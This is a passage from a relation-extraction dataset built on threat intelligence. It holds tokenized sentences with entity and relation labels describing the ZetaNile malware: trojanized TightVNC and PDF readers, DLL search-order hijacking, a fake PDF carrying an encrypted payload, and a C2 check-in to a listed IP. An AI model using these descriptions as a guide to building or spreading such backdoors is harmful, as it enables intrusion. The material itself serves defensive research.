"SecurePDF.exe", "pos": [26, 27], "index": "35_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [342, 342], "name": "ZetaNile implant", "pos": [35, 37], "index": "36_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [350, 350], "name": "themed file", "pos": [43, 45], "index": "37_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "RF", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [0], "h": 1, "t": 3}, {"r": "WR", "evidence": [0], "t": 3, "h": 4}, {"r": "WR", "evidence": [0], "t": 3, "h": 4}, {"r": "WR", "evidence": [0, 1], "t": 3, "h": 5}, {"r": "WR", "evidence": [0, 1], "t": 3, "h": 6}, {"r": "WR", "evidence": [1], "h": 7, "t": 8}, {"r": "EX", "evidence": [1], "t": 8, "h": 9}, {"r": "EX", "evidence": [1], "h": 9, "t": 10}, {"r": "ST", "evidence": [2], "h": 11, "t": 12}, {"r": "RF", "evidence": [2], "h": 11, "t": 12}, {"r": "FR", "evidence": [2], "h": 13, "t": 14}, {"r": "EX", "evidence": [2], "h": 14, "t": 15}, {"r": "RD", "evidence": [2], "h": 14, "t": 16}, {"r": "RF", "evidence": [2], "h": 14, "t": 17}, {"r": "WR", "evidence": [2, 3], "h": 14, "t": 18}, {"r": "WR", "evidence": [2, 3, 4], "h": 14, "t": 22}, {"r": "WR", "evidence": [3, 4, 5, 6], "t": 18, "h": 24}, {"r": "WR", "evidence": [4, 5, 6], "t": 22, "h": 24}, {"r": "ST", "evidence": [6], "h": 24, "t": 25}, {"r": "RF", "evidence": [6], "h": 24, "t": 25}, {"r": "FR", "evidence": [6], "h": 24, "t": 26}, {"r": "ST", "evidence": [6], "t": 25, "h": 26}, {"r": "RF", "evidence": [6], "t": 25, "h": 26}, {"r": "WR", "evidence": [6], "h": 26, "t": 27}, {"r": "WR", "evidence": [6], "t": 27, "h": 28}, {"r": "ST", "evidence": [6], "h": 28, "t": 29}, {"r": "RF", "evidence": [6], "h": 28, "t": 29}, {"r": "ST", "evidence": [6], "h": 28, "t": 30}, {"r": "RF", "evidence": [6], "h": 28, "t": 30}, {"r": "ST", "evidence": [6], "h": 28, "t": 31}, {"r": "RF", "evidence": [6], "h": 28, "t": 31}, {"r": "RD", "evidence": [6], "h": 28, "t": 32}, {"r": "WR", "evidence": [6], "t": 32, "h": 33}, {"r": "RD", "evidence": [6, 7], "t": 32, "h": 34}, {"r": "FR", "evidence": [7], "h": 35, "t": 36}, {"r": "RD", "evidence": [7], "h": 35, "t": 37}]}, {"title": "054-11", "sents": [["Similar", "to", "ZINC", "'s", "version", "of", "PuTTY", ",", "the", "ZetaNile", "malware", "uses", "DLL", "search", "order", "hijacking", "to", "load", "malicious", "DLL", "files", "to", "perform", "tasks", "within", "the", "context", "of", "legitimate", "Windows", "processes", "such", "as", "%", "AppData", "%", "\\KiTTY\\PresentationHost.exe", "-EmbeddingObject", "."], ["The", "mscoree.dll", "malware", "is", "modularized", "so", "that", "once", "it", "establishes", "a", "connection", "to", "the", "compromised", "C2", "domain", ",", "it", "can", "install", "additional", "malware", "as", "necessary", "using", "existing", "C2", "communication", ".", "For", "instance", ",", "it", "can", "execute", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["HTTP", "POST", "requests", "have", "a", "hardcoded", "UA", "string", "with", "a", "misspelled", "``", "Edge", "''", "and", "contain", "a", "unique", "ID", "for", "the", "gametype", "field", "and", "a", "hardcoded", "value", "for", "the", "type", "field", "for", "tracking", "purposes", "."], ["This", "malware", "has", "a", "unique", "PDBPath", ".", "Finally", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "and", "a", "readme.txt", "to", "aid", "them", "in", "running", "the", "archive", "."], ["The", "archive", "provided", "to", "recipients", "contains", "a", ".txt", "file", "with", "instructions", "and", "an", "executable", "file", "to", "run", "."], ["The", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", "and", "installs", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "displayed", ".", "The", "malware", "sends", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establishes", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", ".", "Once", "it", "establishes", "a", "connection", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "known", "compromised", "domains", "."], ["In", "comparison", ",", "the", "Sumatra", "PDF", "reader", "is", "functional", ",", "and", "the", "muPDF/Subliminal", "Recording", "installer", "sets", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", ".", "SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."], ["The", "fake", "PDF", "includes", "a", "header", "``", "SPV005", "''", ",", "a", "decryption", "key", ",", "encrypted", "second", "stage", "implant", "payload", ",", "and", "an", "encrypted", "decoy", "PDF", ",", "which", "is", "rendered", "in", "the", "Sumatra", "PDF", "Reader", "when", "the", "file", "is", "opened", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "ZINC", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "PuTTY", "pos": [6, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [12, 12], "name": "DLL search order hijacking", "pos": [12, 16], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [19, 19], "name": "DLL files", "pos": [19, 21], "index": "3_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [29, 29], "name": "Windows processes", "pos": [29, 31], "index": "4_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [33, 33], "name": "% AppData % \\KiTTY\\PresentationHost.exe -EmbeddingObject", "pos": [33, 38], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "mscoree.dll malware", "pos": [1, 3], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [54, 54], "name": "C2 domain", "pos": [15, 17], "index": "7_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [57, 57], "name": "it", "pos": [18, 19], "index": "8_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [61, 61], "name": "malware", "pos": [22, 23], "index": "9_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [75, 75], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [36, 39], "index": "10_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [83, 83], "name": "mapistub.dll", "pos": [44, 45], "index": "11_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [87, 87], "name": "C2 server", "pos": [48, 50], "index": "12_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [90, 90], "name": "HTTP POST requests", "pos": [0, 3], "index": "13_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [111, 111], "name": "gametype field", "pos": [21, 23], "index": "14_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [115, 115], "name": "hardcoded value", "pos": [25, 27], "index": "15_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [130, 130], "name": "PDBPath", "pos": [5, 6], "index": "16_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [140, 140], "name": "executable file", "pos": [15, 17], "index": "17_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [144, 144], "name": "readme.txt", "pos": [19, 20], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [173, 173], "name": "TightVNC Viewer", "pos": [2, 4], "index": "19_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [180, 180], "name": "remote hosts", "pos": [9, 11], "index": "20_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [185, 185], "name": "backdoor", "pos": [14, 15], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [191, 191], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [20, 21], "index": "22_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [199, 199], "name": "malware", "pos": [28, 29], "index": "23_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [207, 207], "name": "44.238.74.84", "pos": [36, 37], "index": "24_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [226, 226], "name": "IP", "pos": [55, 56], "index": "25_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [238, 238], "name": "server IP", "pos": [67, 69], "index": "26_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [245, 245], "name": "DLL payload", "pos": [74, 76], "index": "27_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [248, 248], "name": "TightVNC.exe", "pos": [77, 78], "index": "28_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [266, 266], "name": "Sumatra PDF", "pos": [4, 6], "index": "29_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [288, 288], "name": "SecurePDF.exe", "pos": [26, 27], "index": "30_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [297, 297], "name": "ZetaNile implant", "pos": [35, 37], "index": "31_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [305, 305], "name": "themed file", "pos": [43, 45], "index": "32_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [314, 314], "name": "PDF", "pos": [2, 3], "index": "33_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [323, 323], "name": "decryption key", "pos": [11, 13], "index": "34_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [330, 330], "name": "payload", "pos": [18, 19], "index": "35_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [334, 334], "name": "encrypted decoy PDF", "pos": [22, 25], "index": "36_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [343, 343], "name": "Sumatra PDF Reader", "pos": [31, 34], "index": "37_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "EX", "evidence": [0], "t": 3, "h": 4}, {"r": "EX", "evidence": [0], "h": 4, "t": 5}, {"r": "ST", "evidence": [1], "h": 6, "t": 7}, {"r": "RF", "evidence": [1], "h": 6, "t": 7}, {"r": "FR", "evidence": [1], "h": 8, "t": 9}, {"r": "EX", "evidence": [1], "h": 9, "t": 10}, {"r": "RD", "evidence": [1], "h": 9, "t": 11}, {"r": "RF", "evidence": [1], "h": 9, "t": 12}, {"r": "WR", "evidence": [1, 2], "h": 9, "t": 13}, {"r": "WR", "evidence": [1, 2, 3], "h": 9, "t": 17}, {"r": "WR", "evidence": [2, 3, 4, 5], "t": 13, "h": 19}, {"r": "WR", "evidence": [3, 4, 5], "t": 17, "h": 19}, {"r": "ST", "evidence": [5], "h": 19, "t": 20}, {"r": "RF", "evidence": [5], "h": 19, "t": 20}, {"r": "FR", "evidence": [5], "h": 19, "t": 21}, {"r": "ST", "evidence": [5], "t": 20, "h": 21}, {"r": "RF", "evidence": [5], "t": 20, "h": 21}, {"r": "WR", "evidence": [5], "h": 21, "t": 22}, {"r": "WR", "evidence": [5], "t": 22, "h": 23}, {"r": "ST", "evidence": [5], "h": 23, "t": 24}, {"r": "RF", "evidence": [5], "h": 23, "t": 24}, {"r": "ST", "evidence": [5], "h": 23, "t": 25}, {"r": "RF", "evidence": [5], "h": 23, "t": 25}, {"r": "ST", "evidence": [5], "h": 23, "t": 26}, {"r": "RF", "evidence": [5], "h": 23, "t": 26}, {"r": "RD", "evidence": [5], "h": 23, "t": 27}, {"r": "WR", "evidence": [5], "t": 27, "h": 28}, {"r": "RD", "evidence": [5, 6], "t": 27, "h": 29}, {"r": "FR", "evidence": [6], "h": 30, "t": 31}, {"r": "RD", "evidence": [6], "h": 30, "t": 32}, {"r": "WR", "evidence": [6, 7], "h": 29, "t": 33}, {"r": "WR", "evidence": [6, 7], "h": 31, "t": 33}, {"r": "WR", "evidence": [6, 7], "h": 31, "t": 35}, {"r": "WR", "evidence": [7], "t": 35, "h": 37}, {"r": "RD", "evidence": [7], "t": 36, "h": 37}, {"r": "CO", "evidence": [7], "h": 33, "t": 36}]}, {"title": "054-12", "sents": [["The", "mscoree.dll", "malware", "is", "modularized", "so", "that", "once", "it", "establishes", "a", "connection", "to", "the", "compromised", "C2", "domain", ",", "it", "can", "install", "additional", "malware", "as", "necessary", "using", "existing", "C2", "communication", ".", "For", "instance", ",", "it", "can", "execute", "C", ":", "\\ProgramData\\Cisco\\fixmapi.exe", "-s", "AudioEndpointBuilder", "to", "load", "malicious", "mapistub.dll", "from", "the", "compromised", "C2", "server", "."], ["HTTP", "POST", "requests", "have", "a", "hardcoded", "UA", "string", "with", "a", "misspelled", "``", "Edge", "''", "and", "contain", "a", "unique", "ID", "for", "the", "gametype", "field", "and", "a", "hardcoded", "value", "for", "the", "type", "field", "for", "tracking", "purposes", "."], ["This", "malware", "has", "a", "unique", "PDBPath", ".", "Finally", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "and", "a", "readme.txt", "to", "aid", "them", "in", "running", "the", "archive", "."], ["The", "archive", "provided", "to", "recipients", "contains", "a", ".txt", "file", "with", "instructions", "and", "an", "executable", "file", "to", "run", "."], ["The", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", "and", "installs", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "displayed", ".", "The", "malware", "sends", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establishes", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", ".", "Once", "it", "establishes", "a", "connection", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "known", "compromised", "domains", "."], ["In", "comparison", ",", "the", "Sumatra", "PDF", "reader", "is", "functional", ",", "and", "the", "muPDF/Subliminal", "Recording", "installer", "sets", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", ".", "SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."], ["The", "fake", "PDF", "includes", "a", "header", "``", "SPV005", "''", ",", "a", "decryption", "key", ",", "encrypted", "second", "stage", "implant", "payload", ",", "and", "an", "encrypted", "decoy", "PDF", ",", "which", "is", "rendered", "in", "the", "Sumatra", "PDF", "Reader", "when", "the", "file", "is", "opened", "."], ["Upon", "being", "loaded", "in", "memory", ",", "the", "second", "stage", "malware", "sends", "the", "victim", "'s", "system", "hostname", "and", "device", "information", "to", "a", "C2", "communication", "server", "using", "custom", "encoding", "algorithms", "as", "part", "of", "the", "C2", "check-in", "process", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "mscoree.dll malware", "pos": [1, 3], "index": "0_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [15, 15], "name": "C2 domain", "pos": [15, 17], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [18, 18], "name": "it", "pos": [18, 19], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [22, 22], "name": "malware", "pos": [22, 23], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [36, 36], "name": "C : \\ProgramData\\Cisco\\fixmapi.exe", "pos": [36, 39], "index": "4_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [44, 44], "name": "mapistub.dll", "pos": [44, 45], "index": "5_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [48, 48], "name": "C2 server", "pos": [48, 50], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [51, 51], "name": "HTTP POST requests", "pos": [0, 3], "index": "7_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [72, 72], "name": "gametype field", "pos": [21, 23], "index": "8_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [76, 76], "name": "hardcoded value", "pos": [25, 27], "index": "9_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [91, 91], "name": "PDBPath", "pos": [5, 6], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [101, 101], "name": "executable file", "pos": [15, 17], "index": "11_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [105, 105], "name": "readme.txt", "pos": [19, 20], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [134, 134], "name": "TightVNC Viewer", "pos": [2, 4], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [141, 141], "name": "remote hosts", "pos": [9, 11], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [146, 146], "name": "backdoor", "pos": [14, 15], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [152, 152], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [20, 21], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [160, 160], "name": "malware", "pos": [28, 29], "index": "17_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [168, 168], "name": "44.238.74.84", "pos": [36, 37], "index": "18_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [187, 187], "name": "IP", "pos": [55, 56], "index": "19_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [199, 199], "name": "server IP", "pos": [67, 69], "index": "20_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [206, 206], "name": "DLL payload", "pos": [74, 76], "index": "21_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [209, 209], "name": "TightVNC.exe", "pos": [77, 78], "index": "22_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [227, 227], "name": "Sumatra PDF", "pos": [4, 6], "index": "23_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [249, 249], "name": "SecurePDF.exe", "pos": [26, 27], "index": "24_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [258, 258], "name": "ZetaNile implant", "pos": [35, 37], "index": "25_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [266, 266], "name": "themed file", "pos": [43, 45], "index": "26_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [275, 275], "name": "PDF", "pos": [2, 3], "index": "27_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [284, 284], "name": "decryption key", "pos": [11, 13], "index": "28_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [291, 291], "name": "payload", "pos": [18, 19], "index": "29_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [295, 295], "name": "encrypted decoy PDF", "pos": [22, 25], "index": "30_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [304, 304], "name": "Sumatra PDF Reader", "pos": [31, 34], "index": "31_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [322, 322], "name": "malware", "pos": [9, 10], "index": "32_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [328, 328], "name": "hostname", "pos": [15, 16], "index": "33_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [330, 330], "name": "device information", "pos": [17, 19], "index": "34_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [334, 334], "name": "C2 communication server", "pos": [21, 24], "index": "35_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [345, 345], "name": "C2 check-in process", "pos": [32, 35], "index": "36_0"}]], "labels": [{"r": "ST", "evidence": [0], "h": 0, "t": 1}, {"r": "RF", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 2, "t": 3}, {"r": "EX", "evidence": [0], "h": 3, "t": 4}, {"r": "RD", "evidence": [0], "h": 3, "t": 5}, {"r": "RF", "evidence": [0], "h": 3, "t": 6}, {"r": "WR", "evidence": [0, 1], "h": 3, "t": 7}, {"r": "WR", "evidence": [0, 1, 2], "h": 3, "t": 11}, {"r": "WR", "evidence": [1, 2, 3, 4], "t": 7, "h": 13}, {"r": "WR", "evidence": [2, 3, 4], "t": 11, "h": 13}, {"r": "ST", "evidence": [4], "h": 13, "t": 14}, {"r": "RF", "evidence": [4], "h": 13, "t": 14}, {"r": "FR", "evidence": [4], "h": 13, "t": 15}, {"r": "ST", "evidence": [4], "t": 14, "h": 15}, {"r": "RF", "evidence": [4], "t": 14, "h": 15}, {"r": "WR", "evidence": [4], "h": 15, "t": 16}, {"r": "WR", "evidence": [4], "t": 16, "h": 17}, {"r": "ST", "evidence": [4], "h": 17, "t": 18}, {"r": "RF", "evidence": [4], "h": 17, "t": 18}, {"r": "ST", "evidence": [4], "h": 17, "t": 19}, {"r": "RF", "evidence": [4], "h": 17, "t": 19}, {"r": "ST", "evidence": [4], "h": 17, "t": 20}, {"r": "RF", "evidence": [4], "h": 17, "t": 20}, {"r": "RD", "evidence": [4], "h": 17, "t": 21}, {"r": "WR", "evidence": [4], "t": 21, "h": 22}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 17, "t": 32}, {"r": "RD", "evidence": [4, 5], "t": 21, "h": 23}, {"r": "FR", "evidence": [5], "h": 24, "t": 25}, {"r": "RD", "evidence": [5], "h": 24, "t": 26}, {"r": "WR", "evidence": [5, 6], "h": 23, "t": 27}, {"r": "WR", "evidence": [5, 6], "h": 25, "t": 27}, {"r": "WR", "evidence": [5, 6], "h": 25, "t": 29}, {"r": "WR", "evidence": [6], "t": 29, "h": 31}, {"r": "RD", "evidence": [6], "t": 30, "h": 31}, {"r": "CO", "evidence": [6], "h": 27, "t": 30}, {"r": "RD", "evidence": [7], "h": 32, "t": 33}, {"r": "RD", "evidence": [7], "h": 32, "t": 34}, {"r": "ST", "evidence": [7], "h": 32, "t": 35}, {"r": "RD", "evidence": [7], "t": 34, "h": 36}]}, {"title": "054-13", "sents": [["HTTP", "POST", "requests", "have", "a", "hardcoded", "UA", "string", "with", "a", "misspelled", "``", "Edge", "''", "and", "contain", "a", "unique", "ID", "for", "the", "gametype", "field", "and", "a", "hardcoded", "value", "for", "the", "type", "field", "for", "tracking", "purposes", "."], ["This", "malware", "has", "a", "unique", "PDBPath", ".", "Finally", ",", "the", "recipient", "is", "provided", "with", "an", "executable", "file", "and", "a", "readme.txt", "to", "aid", "them", "in", "running", "the", "archive", "."], ["The", "archive", "provided", "to", "recipients", "contains", "a", ".txt", "file", "with", "instructions", "and", "an", "executable", "file", "to", "run", "."], ["The", "malicious", "TightVNC", "Viewer", "has", "a", "pre-populated", "list", "of", "remote", "hosts", "and", "installs", "the", "backdoor", "only", "when", "the", "user", "selects", "ec2-aet-tech.w-ada.amazonaws", "from", "the", "drop-down", "menu", "displayed", ".", "The", "malware", "sends", "the", "username", "and", "hostname", "to", "IP", "44.238.74.84", "on", "TCP/22", "as", "part", "of", "the", "victim", "check-in", "with", "the", "C2", "and", "establishes", "VNC", "connections", "to", "the", "same", "IP", "on", "port", "TCP/5900", ".", "Once", "it", "establishes", "a", "connection", "to", "the", "server", "IP", ",", "the", "embedded", "second", "stage", "DLL", "payload", "from", "TightVNC.exe", "is", "loaded", "in", "memory", "to", "establish", "C2", "communication", "to", "known", "compromised", "domains", "."], ["In", "comparison", ",", "the", "Sumatra", "PDF", "reader", "is", "functional", ",", "and", "the", "muPDF/Subliminal", "Recording", "installer", "sets", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", ".", "SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."], ["The", "fake", "PDF", "includes", "a", "header", "``", "SPV005", "''", ",", "a", "decryption", "key", ",", "encrypted", "second", "stage", "implant", "payload", ",", "and", "an", "encrypted", "decoy", "PDF", ",", "which", "is", "rendered", "in", "the", "Sumatra", "PDF", "Reader", "when", "the", "file", "is", "opened", "."], ["Upon", "being", "loaded", "in", "memory", ",", "the", "second", "stage", "malware", "sends", "the", "victim", "'s", "system", "hostname", "and", "device", "information", "to", "a", "C2", "communication", "server", "using", "custom", "encoding", "algorithms", "as", "part", "of", "the", "C2", "check-in", "process", "."], ["The", "attackers", "have", "the", "ability", "to", "install", "extra", "malware", "onto", "compromised", "devices", "as", "required", "through", "the", "C2", "communication", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [0, 0], "name": "HTTP POST requests", "pos": [0, 3], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [21, 21], "name": "gametype field", "pos": [21, 23], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [25, 25], "name": "hardcoded value", "pos": [25, 27], "index": "2_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [40, 40], "name": "PDBPath", "pos": [5, 6], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [50, 50], "name": "executable file", "pos": [15, 17], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [54, 54], "name": "readme.txt", "pos": [19, 20], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [83, 83], "name": "TightVNC Viewer", "pos": [2, 4], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [90, 90], "name": "remote hosts", "pos": [9, 11], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [95, 95], "name": "backdoor", "pos": [14, 15], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [101, 101], "name": "ec2-aet-tech.w-ada.amazonaws", "pos": [20, 21], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [109, 109], "name": "malware", "pos": [28, 29], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [117, 117], "name": "44.238.74.84", "pos": [36, 37], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [136, 136], "name": "IP", "pos": [55, 56], "index": "12_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [148, 148], "name": "server IP", "pos": [67, 69], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [155, 155], "name": "DLL payload", "pos": [74, 76], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [158, 158], "name": "TightVNC.exe", "pos": [77, 78], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [176, 176], "name": "Sumatra PDF", "pos": [4, 6], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [198, 198], "name": "SecurePDF.exe", "pos": [26, 27], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [207, 207], "name": "ZetaNile implant", "pos": [35, 37], "index": "18_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [215, 215], "name": "themed file", "pos": [43, 45], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [224, 224], "name": "PDF", "pos": [2, 3], "index": "20_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [233, 233], "name": "decryption key", "pos": [11, 13], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [240, 240], "name": "payload", "pos": [18, 19], "index": "22_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [244, 244], "name": "encrypted decoy PDF", "pos": [22, 25], "index": "23_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [253, 253], "name": "Sumatra PDF Reader", "pos": [31, 34], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [271, 271], "name": "malware", "pos": [9, 10], "index": "25_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [277, 277], "name": "hostname", "pos": [15, 16], "index": "26_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [279, 279], "name": "device information", "pos": [17, 19], "index": "27_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [283, 283], "name": "C2 communication server", "pos": [21, 24], "index": "28_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [294, 294], "name": "C2 check-in process", "pos": [32, 35], "index": "29_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [299, 299], "name": "attackers", "pos": [1, 2], "index": "30_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [306, 306], "name": "malware", "pos": [8, 9], "index": "31_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [314, 314], "name": "C2 communication", "pos": [16, 18], "index": "32_0"}]], "labels": [{"r": "WR", "evidence": [0, 1, 2, 3], "t": 0, "h": 6}, {"r": "WR", "evidence": [1, 2, 3], "t": 4, "h": 6}, {"r": "ST", "evidence": [3], "h": 6, "t": 7}, {"r": "RF", "evidence": [3], "h": 6, "t": 7}, {"r": "FR", "evidence": [3], "h": 6, "t": 8}, {"r": "ST", "evidence": [3], "t": 7, "h": 8}, {"r": "RF", "evidence": [3], "t": 7, "h": 8}, {"r": "WR", "evidence": [3], "h": 8, "t": 9}, {"r": "WR", "evidence": [3], "t": 9, "h": 10}, {"r": "ST", "evidence": [3], "h": 10, "t": 11}, {"r": "RF", "evidence": [3], "h": 10, "t": 11}, {"r": "ST", "evidence": [3], "h": 10, "t": 12}, {"r": "RF", "evidence": [3], "h": 10, "t": 12}, {"r": "ST", "evidence": [3], "h": 10, "t": 13}, {"r": "RF", "evidence": [3], "h": 10, "t": 13}, {"r": "RD", "evidence": [3], "h": 10, "t": 14}, {"r": "WR", "evidence": [3], "t": 14, "h": 15}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 10, "t": 25}, {"r": "RD", "evidence": [3, 4], "t": 14, "h": 16}, {"r": "FR", "evidence": [4], "h": 17, "t": 